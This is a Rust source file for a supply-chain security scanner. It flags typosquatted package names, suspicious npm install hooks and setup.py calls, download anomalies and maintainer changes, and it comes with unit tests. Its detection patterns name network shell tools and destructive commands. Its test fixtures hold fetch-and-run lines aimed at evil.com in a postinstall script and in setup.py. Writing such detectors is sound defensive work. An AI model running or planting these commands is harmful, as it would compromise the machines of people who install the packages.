//! Supply chain security scanner — typosquatting, publication anomaly,
//! and package manifest analysis.
//!
//! Detects potentially malicious or compromised packages in the dependency tree.

use crate::config::ScanConfig;
use crate::error::ScanError;
use crate::finding::{
    Finding, FindingCategory, FindingExplanation, FindingProvenance, FindingSeverity, Remediation,
    RemediationEffort,
};
use crate::scanner::{ScanContext, Scanner, ScannerRiskLevel, ScannerVersion};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};

/// Popular package names per ecosystem for typosquatting detection.
const POPULAR_NPM: &[&str] = &[
    "express",
    "react",
    "lodash",
    "axios",
    "moment",
    "webpack",
    "babel",
    "typescript",
    "eslint",
    "prettier",
    "chalk",
    "commander",
    "request",
    "underscore",
    "async",
    "bluebird",
    "uuid",
    "dotenv",
    "cors",
    "jest",
    "mocha",
    "debug",
    "body-parser",
    "mongoose",
    "socket.io",
    "passport",
    "jsonwebtoken",
    "bcrypt",
    "nodemailer",
    "sequelize",
];

const POPULAR_PYPI: &[&str] = &[
    "requests",
    "numpy",
    "pandas",
    "flask",
    "django",
    "scipy",
    "pillow",
    "matplotlib",
    "cryptography",
    "sqlalchemy",
    "celery",
    "boto3",
    "beautifulsoup4",
    "pyyaml",
    "pytest",
    "setuptools",
    "pip",
    "wheel",
    "six",
    "urllib3",
    "certifi",
    "idna",
    "chardet",
    "jinja2",
    "click",
    "pygments",
    "pydantic",
    "fastapi",
    "httpx",
    "aiohttp",
];

const POPULAR_CRATES: &[&str] = &[
    "serde",
    "tokio",
    "clap",
    "reqwest",
    "anyhow",
    "thiserror",
    "tracing",
    "rand",
    "regex",
    "chrono",
    "uuid",
    "serde_json",
    "log",
    "futures",
    "hyper",
    "axum",
    "actix-web",
    "diesel",
    "sqlx",
    "tower",
];

/// Supply chain threat type.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SupplyChainThreat {
    /// Package name is suspiciously similar to a popular package.
    Typosquat { similar_to: String, distance: usize },
    /// Package has suspicious install scripts.
    SuspiciousScript { script_type: String },
    /// Package was recently published with high download count.
    PublicationAnomaly { reason: String },
    /// Package accesses network or filesystem during install.
    SuspiciousBehavior { behavior: String },
    /// Package maintainer was recently changed.
    MaintainerChange { previous: String, current: String },
}

impl std::fmt::Display for SupplyChainThreat {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SupplyChainThreat::Typosquat {
                similar_to,
                distance,
            } => {
                write!(f, "Typosquat of '{similar_to}' (distance: {distance})")
            }
            SupplyChainThreat::SuspiciousScript { script_type } => {
                write!(f, "Suspicious {script_type} script")
            }
            SupplyChainThreat::PublicationAnomaly { reason } => {
                write!(f, "Publication anomaly: {reason}")
            }
            SupplyChainThreat::SuspiciousBehavior { behavior } => {
                write!(f, "Suspicious behavior: {behavior}")
            }
            SupplyChainThreat::MaintainerChange { previous, current } => {
                write!(f, "Maintainer changed from {previous} to {current}")
            }
        }
    }
}

/// A supply chain finding with context.
#[derive(Debug, Clone)]
pub struct SupplyChainFinding {
    /// Package name.
    pub package: String,
    /// Ecosystem (npm, pypi, crates.io).
    pub ecosystem: String,
    /// Version.
    pub version: String,
    /// Threat type.
    pub threat: SupplyChainThreat,
    /// Confidence (0.0-1.0).
    pub confidence: f32,
}

/// Information about a maintainer change for supply chain analysis.
#[derive(Debug, Clone)]
pub struct MaintainerChangeInfo<'a> {
    /// Package name.
    pub name: &'a str,
    /// Ecosystem (npm, pypi, crates.io).
    pub ecosystem: &'a str,
    /// Number of maintainers before the change.
    pub previous_maintainer_count: usize,
    /// Current number of maintainers.
    pub current_maintainer_count: usize,
    /// Name/email of the original maintainer.
    pub previous_maintainer: &'a str,
    /// Names/emails of the new maintainers.
    pub new_maintainers: &'a [String],
    /// How recently the maintainer change occurred (in days).
    pub days_since_change: u64,
}

/// Supply chain security scanner.
pub struct SupplyChainScanner {
    /// Minimum edit distance threshold for typosquatting (lower = more strict).
    typosquat_threshold: usize,
}

impl SupplyChainScanner {
    pub fn new() -> Self {
        Self {
            typosquat_threshold: 2,
        }
    }

    /// Check a package name for typosquatting against known popular packages.
    pub fn check_typosquat(&self, name: &str, ecosystem: &str) -> Option<SupplyChainFinding> {
        let popular = match ecosystem {
            "npm" | "javascript" => POPULAR_NPM.to_vec(),
            "pypi" | "python" => POPULAR_PYPI.to_vec(),
            "crates.io" | "rust" => POPULAR_CRATES.to_vec(),
            _ => return None,
        };

        // Don't flag if the package IS a popular package
        if popular.contains(&name) {
            return None;
        }

        for &popular_name in &popular {
            let distance = levenshtein_distance(name, popular_name);
            if distance > 0 && distance <= self.typosquat_threshold {
                return Some(SupplyChainFinding {
                    package: name.to_string(),
                    ecosystem: ecosystem.to_string(),
                    version: String::new(),
                    threat: SupplyChainThreat::Typosquat {
                        similar_to: popular_name.to_string(),
                        distance,
                    },
                    confidence: if distance == 1 { 0.85 } else { 0.65 },
                });
            }
        }

        None
    }

    /// Analyze a package.json for suspicious install scripts.
    pub fn analyze_npm_scripts(&self, package_json: &str) -> Vec<SupplyChainFinding> {
        let mut findings = Vec::new();

        let value: serde_json::Value = match serde_json::from_str(package_json) {
            Ok(v) => v,
            Err(_) => return findings,
        };

        let name = value
            .get("name")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string();

        let version = value
            .get("version")
            .and_then(|v| v.as_str())
            .unwrap_or("0.0.0")
            .to_string();

        if let Some(scripts) = value.get("scripts").and_then(|s| s.as_object()) {
            let suspicious_hooks = ["preinstall", "postinstall", "preuninstall"];

            for hook in &suspicious_hooks {
                if let Some(script) = scripts.get(*hook).and_then(|s| s.as_str()) {
                    let lower = script.to_lowercase();
                    let is_suspicious = lower.contains("curl ")
                        || lower.contains("wget ")
                        || lower.contains("eval(")
                        || lower.contains("base64")
                        || lower.contains("/dev/tcp")
                        || lower.contains("powershell")
                        || lower.contains("nc -e")
                        || lower.contains("rm -rf /")
                        || lower.contains("$env:")
                        || (lower.contains("http://") || lower.contains("https://"))
                            && (lower.contains("| sh") || lower.contains("| bash"));

                    if is_suspicious {
                        findings.push(SupplyChainFinding {
                            package: name.clone(),
                            ecosystem: "npm".to_string(),
                            version: version.clone(),
                            threat: SupplyChainThreat::SuspiciousScript {
                                script_type: hook.to_string(),
                            },
                            confidence: 0.80,
                        });
                    }
                }
            }
        }

        findings
    }

    /// Analyze a setup.py or pyproject.toml for suspicious patterns.
    pub fn analyze_python_package(
        &self,
        content: &str,
        file_name: &str,
    ) -> Vec<SupplyChainFinding> {
        let mut findings = Vec::new();

        if file_name == "setup.py" {
            let suspicious_patterns = [
                ("os.system(", "System command execution"),
                ("subprocess.", "Subprocess execution"),
                ("exec(", "Dynamic code execution"),
                ("eval(", "Dynamic expression evaluation"),
                (
                    "__import__('base64')",
                    "Base64 import (possible obfuscation)",
                ),
                ("urllib.request.urlopen", "Network access during setup"),
                ("requests.get", "Network access during setup"),
                ("socket.", "Socket operations during setup"),
            ];

            for (pattern, desc) in &suspicious_patterns {
                if content.contains(pattern) {
                    findings.push(SupplyChainFinding {
                        package: String::new(),
                        ecosystem: "pypi".to_string(),
                        version: String::new(),
                        threat: SupplyChainThreat::SuspiciousBehavior {
                            behavior: desc.to_string(),
                        },
                        confidence: 0.75,
                    });
                }
            }
        }

        findings
    }

    /// Check for publication anomaly: flags packages that are very new with
    /// unusually high download counts, or dormant packages with sudden activity spikes.
    ///
    /// - New package anomaly: created < 30 days ago with > 10,000 weekly downloads
    /// - Dormant package anomaly: > 365 days since last update with > 10,000 weekly downloads
    ///   (indicating a sudden activity spike on a previously inactive package)
    pub fn check_publication_anomaly(
        &self,
        name: &str,
        ecosystem: &str,
        days_since_creation: u64,
        weekly_downloads: u64,
    ) -> Option<SupplyChainFinding> {
        const NEW_PACKAGE_THRESHOLD_DAYS: u64 = 30;
        const DORMANT_THRESHOLD_DAYS: u64 = 365;
        const HIGH_DOWNLOAD_THRESHOLD: u64 = 10_000;

        if days_since_creation < NEW_PACKAGE_THRESHOLD_DAYS
            && weekly_downloads > HIGH_DOWNLOAD_THRESHOLD
        {
            // Very new package with suspiciously high download count
            let confidence = if weekly_downloads > 100_000 {
                0.90
            } else if weekly_downloads > 50_000 {
                0.80
            } else {
                0.70
            };

            return Some(SupplyChainFinding {
                package: name.to_string(),
                ecosystem: ecosystem.to_string(),
                version: String::new(),
                threat: SupplyChainThreat::PublicationAnomaly {
                    reason: format!(
                        "Package is only {days_since_creation} days old but has {weekly_downloads} weekly downloads (threshold: {NEW_PACKAGE_THRESHOLD_DAYS} days / {HIGH_DOWNLOAD_THRESHOLD} downloads)"
                    ),
                },
                confidence,
            });
        }

        if days_since_creation > DORMANT_THRESHOLD_DAYS
            && weekly_downloads > HIGH_DOWNLOAD_THRESHOLD
        {
            // Dormant package with sudden activity spike
            let confidence = if weekly_downloads > 100_000 {
                0.85
            } else if weekly_downloads > 50_000 {
                0.75
            } else {
                0.65
            };

            return Some(SupplyChainFinding {
                package: name.to_string(),
                ecosystem: ecosystem.to_string(),
                version: String::new(),
                threat: SupplyChainThreat::PublicationAnomaly {
                    reason: format!(
                        "Package dormant for {days_since_creation} days but has {weekly_downloads} weekly downloads spike (thresholds: {DORMANT_THRESHOLD_DAYS} days / {HIGH_DOWNLOAD_THRESHOLD} downloads)"
                    ),
                },
                confidence,
            });
        }

        None
    }

    /// Check for suspicious maintainer changes: flags if the maintainer count
    /// went from a single maintainer to multiple maintainers recently, which
    /// could indicate a hijacked or compromised package.
    ///
    /// Uses `MaintainerChangeInfo` to bundle the required context about the change.
    pub fn check_maintainer_change(
        &self,
        info: &MaintainerChangeInfo<'_>,
    ) -> Option<SupplyChainFinding> {
        const RECENT_CHANGE_THRESHOLD_DAYS: u64 = 90;

        // Flag if maintainer count went from 1 to >1 recently
        if info.previous_maintainer_count == 1
            && info.current_maintainer_count > 1
            && info.days_since_change < RECENT_CHANGE_THRESHOLD_DAYS
        {
            let confidence = if info.days_since_change < 7 {
                0.80 // Very recent change is more suspicious
            } else if info.days_since_change < 30 {
                0.70
            } else {
                0.60
            };

            let current_display = if info.new_maintainers.is_empty() {
                format!("{} maintainers", info.current_maintainer_count)
            } else {
                info.new_maintainers.join(", ")
            };

            return Some(SupplyChainFinding {
                package: info.name.to_string(),
                ecosystem: info.ecosystem.to_string(),
                version: String::new(),
                threat: SupplyChainThreat::MaintainerChange {
                    previous: info.previous_maintainer.to_string(),
                    current: current_display,
                },
                confidence,
            });
        }

        None
    }

    /// Convert a supply chain finding to a unified Finding.
    pub fn to_finding(&self, sc_finding: &SupplyChainFinding) -> Finding {
        let severity = match &sc_finding.threat {
            SupplyChainThreat::Typosquat { distance, .. } => {
                if *distance == 1 {
                    FindingSeverity::High
                } else {
                    FindingSeverity::Medium
                }
            }
            SupplyChainThreat::SuspiciousScript { .. } => FindingSeverity::Critical,
            SupplyChainThreat::SuspiciousBehavior { .. } => FindingSeverity::High,
            SupplyChainThreat::PublicationAnomaly { .. } => FindingSeverity::Medium,
            SupplyChainThreat::MaintainerChange { .. } => FindingSeverity::Medium,
        };

        let title = format!(
            "Supply chain risk: {} in {} ({})",
            sc_finding.threat, sc_finding.package, sc_finding.ecosystem
        );

        let mut finding = Finding::new(
            &title,
            sc_finding.threat.to_string(),
            severity,
            FindingCategory::Security,
            FindingProvenance {
                scanner: "supply_chain".to_string(),
                rule_id: Some(
                    match &sc_finding.threat {
                        SupplyChainThreat::Typosquat { .. } => "SC-001",
                        SupplyChainThreat::SuspiciousScript { .. } => "SC-002",
                        SupplyChainThreat::PublicationAnomaly { .. } => "SC-003",
                        SupplyChainThreat::SuspiciousBehavior { .. } => "SC-004",
                        SupplyChainThreat::MaintainerChange { .. } => "SC-005",
                    }
                    .to_string(),
                ),
                confidence: sc_finding.confidence,
                consensus: None,
            },
        );

        finding = finding.with_remediation(Remediation {
            description: match &sc_finding.threat {
                SupplyChainThreat::Typosquat { similar_to, .. } => {
                    format!(
                        "Verify this is the intended package and not a typosquat of '{similar_to}'"
                    )
                }
                SupplyChainThreat::SuspiciousScript { .. } => {
                    "Review the install scripts carefully before installing".to_string()
                }
                _ => "Review the package carefully before using".to_string(),
            },
            patch: None,
            effort: Some(RemediationEffort::Low),
            confidence: sc_finding.confidence,
        });

        finding = finding.with_explanation(FindingExplanation {
            reasoning_chain: vec![
                format!(
                    "Package '{}' in {} ecosystem",
                    sc_finding.package, sc_finding.ecosystem
                ),
                format!("Detected threat: {}", sc_finding.threat),
            ],
            evidence: vec![format!("Confidence: {:.0}%", sc_finding.confidence * 100.0)],
            context_factors: Vec::new(),
        });

        finding.with_tag("supply-chain")
    }
}

impl Default for SupplyChainScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Scanner for SupplyChainScanner {
    fn name(&self) -> &str {
        "supply_chain"
    }

    fn version(&self) -> ScannerVersion {
        ScannerVersion {
            major: 1,
            minor: 0,
            patch: 0,
        }
    }

    fn supported_categories(&self) -> Vec<FindingCategory> {
        vec![FindingCategory::Security, FindingCategory::Dependency]
    }

    fn supports_language(&self, _language: &str) -> bool {
        true
    }

    async fn scan(
        &self,
        _config: &ScanConfig,
        context: &ScanContext,
    ) -> Result<Vec<Finding>, ScanError> {
        let mut findings = Vec::new();

        for file in &context.files {
            let filename = file.file_name().and_then(|f| f.to_str()).unwrap_or("");

            if filename == "package.json"
                && let Ok(content) = std::fs::read_to_string(file)
            {
                let sc_findings = self.analyze_npm_scripts(&content);
                findings.extend(sc_findings.iter().map(|f| self.to_finding(f)));
            }

            if filename == "setup.py"
                && let Ok(content) = std::fs::read_to_string(file)
            {
                let sc_findings = self.analyze_python_package(&content, filename);
                findings.extend(sc_findings.iter().map(|f| self.to_finding(f)));
            }
        }

        Ok(findings)
    }

    fn risk_level(&self) -> ScannerRiskLevel {
        ScannerRiskLevel::ReadOnly
    }
}

/// Compute Levenshtein edit distance between two strings.
fn levenshtein_distance(a: &str, b: &str) -> usize {
    let a_len = a.len();
    let b_len = b.len();

    if a_len == 0 {
        return b_len;
    }
    if b_len == 0 {
        return a_len;
    }

    let mut prev_row: Vec<usize> = (0..=b_len).collect();
    let mut curr_row = vec![0; b_len + 1];

    for (i, a_char) in a.chars().enumerate() {
        curr_row[0] = i + 1;
        for (j, b_char) in b.chars().enumerate() {
            let cost = if a_char == b_char { 0 } else { 1 };
            curr_row[j + 1] = (prev_row[j + 1] + 1)
                .min(curr_row[j] + 1)
                .min(prev_row[j] + cost);
        }
        std::mem::swap(&mut prev_row, &mut curr_row);
    }

    prev_row[b_len]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_levenshtein() {
        assert_eq!(levenshtein_distance("kitten", "sitting"), 3);
        assert_eq!(levenshtein_distance("", "abc"), 3);
        assert_eq!(levenshtein_distance("abc", "abc"), 0);
        assert_eq!(levenshtein_distance("abc", "ab"), 1);
    }

    #[test]
    fn test_typosquat_detection() {
        let scanner = SupplyChainScanner::new();

        // 1 edit distance from "express"
        let result = scanner.check_typosquat("expresss", "npm");
        assert!(result.is_some());
        let finding = result.unwrap();
        assert!(matches!(
            finding.threat,
            SupplyChainThreat::Typosquat { .. }
        ));

        // Exact match should not be flagged
        assert!(scanner.check_typosquat("express", "npm").is_none());

        // Too different should not be flagged
        assert!(scanner.check_typosquat("totallyunrelated", "npm").is_none());
    }

    #[test]
    fn test_typosquat_python() {
        let scanner = SupplyChainScanner::new();

        // 1 edit distance from "requests"
        let result = scanner.check_typosquat("requets", "pypi");
        assert!(result.is_some());
    }

    #[test]
    fn test_typosquat_crates() {
        let scanner = SupplyChainScanner::new();

        // 1 edit distance from "serde"
        let result = scanner.check_typosquat("serde1", "crates.io");
        assert!(result.is_some());
    }

    #[test]
    fn test_npm_suspicious_scripts() {
        let scanner = SupplyChainScanner::new();

        let malicious = r#"{
            "name": "evil-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.com/payload | bash"
            }
        }"#;

        let findings = scanner.analyze_npm_scripts(malicious);
        assert_eq!(findings.len(), 1);
        assert!(matches!(
            findings[0].threat,
            SupplyChainThreat::SuspiciousScript { .. }
        ));
    }

    #[test]
    fn test_npm_normal_scripts() {
        let scanner = SupplyChainScanner::new();

        let normal = r#"{
            "name": "normal-package",
            "version": "1.0.0",
            "scripts": {
                "build": "tsc",
                "test": "jest"
            }
        }"#;

        let findings = scanner.analyze_npm_scripts(normal);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_python_suspicious_setup() {
        let scanner = SupplyChainScanner::new();

        let setup = "from setuptools import setup\nimport os\nos.system('curl http://evil.com | sh')\nsetup(name='evil')\n";
        let findings = scanner.analyze_python_package(setup, "setup.py");
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_to_finding() {
        let scanner = SupplyChainScanner::new();
        let sc_finding = SupplyChainFinding {
            package: "expresss".to_string(),
            ecosystem: "npm".to_string(),
            version: "1.0.0".to_string(),
            threat: SupplyChainThreat::Typosquat {
                similar_to: "express".to_string(),
                distance: 1,
            },
            confidence: 0.85,
        };

        let finding = scanner.to_finding(&sc_finding);
        assert_eq!(finding.severity, FindingSeverity::High);
        assert!(finding.title.contains("Supply chain"));
        assert!(finding.remediation.is_some());
    }

    #[test]
    fn test_threat_display() {
        let threat = SupplyChainThreat::Typosquat {
            similar_to: "express".to_string(),
            distance: 1,
        };
        assert!(threat.to_string().contains("express"));
    }

    #[test]
    fn test_scanner_metadata() {
        let scanner = SupplyChainScanner::new();
        assert_eq!(scanner.name(), "supply_chain");
        assert_eq!(scanner.risk_level(), ScannerRiskLevel::ReadOnly);
    }

    #[test]
    fn test_publication_anomaly_new_package_high_downloads() {
        let scanner = SupplyChainScanner::new();

        // New package (10 days old) with very high downloads
        let result = scanner.check_publication_anomaly("suspicious-pkg", "npm", 10, 50_001);
        assert!(result.is_some());
        let finding = result.unwrap();
        assert!(matches!(
            finding.threat,
            SupplyChainThreat::PublicationAnomaly { .. }
        ));
        assert_eq!(finding.confidence, 0.80);
        assert_eq!(finding.package, "suspicious-pkg");
        assert_eq!(finding.ecosystem, "npm");

        // Extremely high downloads should get higher confidence
        let result = scanner.check_publication_anomaly("mega-sus", "pypi", 5, 200_000);
        assert!(result.is_some());
        assert_eq!(result.unwrap().confidence, 0.90);
    }

    #[test]
    fn test_publication_anomaly_dormant_package_spike() {
        let scanner = SupplyChainScanner::new();

        // Dormant package (500 days) with sudden download spike
        let result = scanner.check_publication_anomaly("old-revived", "crates.io", 500, 15_000);
        assert!(result.is_some());
        let finding = result.unwrap();
        assert!(matches!(
            finding.threat,
            SupplyChainThreat::PublicationAnomaly { .. }
        ));
        assert_eq!(finding.confidence, 0.65);

        // Higher spike = higher confidence
        let result = scanner.check_publication_anomaly("old-revived", "npm", 400, 75_000);
        assert!(result.is_some());
        assert_eq!(result.unwrap().confidence, 0.75);
    }

    #[test]
    fn test_publication_anomaly_normal_package() {
        let scanner = SupplyChainScanner::new();

        // Normal: established package with moderate downloads
        assert!(
            scanner
                .check_publication_anomaly("normal-pkg", "npm", 200, 5_000)
                .is_none()
        );

        // Normal: new package with low downloads
        assert!(
            scanner
                .check_publication_anomaly("new-pkg", "npm", 5, 100)
                .is_none()
        );

        // Normal: old package with low downloads (genuinely dormant)
        assert!(
            scanner
                .check_publication_anomaly("dormant-pkg", "pypi", 500, 50)
                .is_none()
        );

        // Normal: medium-age package with high downloads (established)
        assert!(
            scanner
                .check_publication_anomaly("established", "npm", 180, 50_000)
                .is_none()
        );
    }

    #[test]
    fn test_maintainer_change_single_to_multiple_recent() {
        let scanner = SupplyChainScanner::new();

        // Single maintainer went to 3 maintainers, 5 days ago
        let new_maintainers = vec![
            "original@example.com".to_string(),
            "new1@example.com".to_string(),
            "new2@example.com".to_string(),
        ];
        let result = scanner.check_maintainer_change(&MaintainerChangeInfo {
            name: "my-package",
            ecosystem: "npm",
            previous_maintainer_count: 1,
            current_maintainer_count: 3,
            previous_maintainer: "original@example.com",
            new_maintainers: &new_maintainers,
            days_since_change: 5,
        });
        assert!(result.is_some());
        let finding = result.unwrap();
        assert!(matches!(
            finding.threat,
            SupplyChainThreat::MaintainerChange { .. }
        ));
        assert_eq!(finding.confidence, 0.80); // Very recent (< 7 days)

        // Same scenario but 15 days ago (within 30-day window)
        let new_maintainers2 = vec![
            "dev@example.com".to_string(),
            "attacker@example.com".to_string(),
        ];
        let result = scanner.check_maintainer_change(&MaintainerChangeInfo {
            name: "another-pkg",
            ecosystem: "pypi",
            previous_maintainer_count: 1,
            current_maintainer_count: 2,
            previous_maintainer: "dev@example.com",
            new_maintainers: &new_maintainers2,
            days_since_change: 15,
        });
        assert!(result.is_some());
        assert_eq!(result.unwrap().confidence, 0.70);
    }

    #[test]
    fn test_maintainer_change_no_flag_old_change() {
        let scanner = SupplyChainScanner::new();

        // Change happened 120 days ago — beyond the 90-day threshold
        let new_maintainers = vec![
            "original@example.com".to_string(),
            "co-maintainer@example.com".to_string(),
        ];
        let result = scanner.check_maintainer_change(&MaintainerChangeInfo {
            name: "stable-pkg",
            ecosystem: "npm",
            previous_maintainer_count: 1,
            current_maintainer_count: 2,
            previous_maintainer: "original@example.com",
            new_maintainers: &new_maintainers,
            days_since_change: 120,
        });
        assert!(result.is_none());
    }

    #[test]
    fn test_maintainer_change_no_flag_multi_to_multi() {
        let scanner = SupplyChainScanner::new();

        // Already had multiple maintainers, added one more
        let new_maintainers = vec!["new-member@example.com".to_string()];
        let result = scanner.check_maintainer_change(&MaintainerChangeInfo {
            name: "team-pkg",
            ecosystem: "npm",
            previous_maintainer_count: 3,
            current_maintainer_count: 4,
            previous_maintainer: "team-lead@example.com",
            new_maintainers: &new_maintainers,
            days_since_change: 5,
        });
        assert!(result.is_none());
    }
}
